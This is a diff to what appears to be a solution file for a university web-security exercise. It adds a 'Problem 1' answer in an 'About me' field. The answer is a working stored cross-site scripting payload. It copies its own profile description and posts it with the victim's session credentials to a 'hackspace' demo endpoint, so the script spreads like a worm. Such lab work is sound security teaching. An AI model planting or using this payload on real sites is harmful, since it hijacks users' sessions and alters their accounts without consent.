@@ -1,4 +1,30 @@
+Problem 1:
+
+Solution:
+
+About me:
+
+<script>
+document.body.style.backgroundColor = "#7ec8e3";
+var desc = document.getElementById("descriptiontext");
+
+var data = new FormData();
+data.append("description", desc.innerHTML);
+data.append("action", "edit");
+var xhr = new XMLHttpRequest();
+xhr.withCredentials = true;
+xhr.addEventListener("readystatechange", function() {
+  if(this.readyState === 4) {
+    console.log(this.responseText);
+  }
+});
+xhr.open("POST", "http://demo.sec.informatik.uni-stuttgart.de/hackspace/?");
+xhr.send(data);
+</script>
+
 Problem 2:
+
+Solution:
 
 Input string:
 
